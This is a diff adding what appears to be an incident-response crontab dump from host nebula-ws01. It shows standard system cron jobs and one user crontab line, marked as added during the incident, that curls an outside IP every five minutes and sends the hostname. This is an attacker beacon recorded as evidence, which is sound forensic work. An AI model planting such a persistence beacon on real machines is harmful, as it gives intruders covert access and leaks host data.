@@ -1,0 +1,10 @@
+# Crontab dump — nebula-ws01
+# /etc/crontab (system)
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+17 * * * * root cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+
+# /var/spool/cron/crontabs/dev01 (user crontab — added during incident)
+*/5 * * * * curl -s http://198.51.100.23:8080/heartbeat?h=$(hostname) > /dev/null 2>&1
